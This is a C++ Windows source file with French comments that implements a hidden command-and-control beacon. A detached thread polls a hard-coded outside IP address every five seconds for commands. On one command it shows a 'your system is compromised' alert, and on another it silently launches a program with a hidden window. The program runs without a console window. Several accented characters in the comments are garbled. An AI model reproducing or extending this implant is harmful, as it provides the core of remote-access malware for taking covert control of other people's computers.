#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <string>
#include "./include/install.h"

using namespace std;

#pragma comment(lib, "wininet.lib")

// Affiche une bo�te de dialogue d'alerte.
void ShowMessage() {
    MessageBox(NULL, TEXT("Votre syst�me est compromis !"), TEXT("Alerte"), MB_OK);
}

// Effectue une requ�te HTTP GET pour r�cup�rer une commande depuis un serveur distant.
string GetCommand() {
    string command;

    HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {

        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[256];
            DWORD bytesRead = 0;

            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                command = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
    return command;
}

// Fonction pour lan�er les maj
void StartUpdate(const string& UpdaterPath) {
    ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
}

// Thread qui interroge p�riodiquement le serveur pour v�rifier la commande.
void ListenForCommand() {
    while (true) {
        string cmd = GetCommand();

        if (cmd == "show") {
            ShowMessage();
        }
        else if (cmd == "update") {
            StartUpdate("bite");
        }

        this_thread::sleep_for(chrono::seconds(5));
    }
}

// Point d'entr�e de l'application Windows (aucune console ne sera affich�e)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    thread listener(ListenForCommand);
    listener.detach();


    while (true) {
        this_thread::sleep_for(chrono::seconds(60));
    }

    return 0;
}
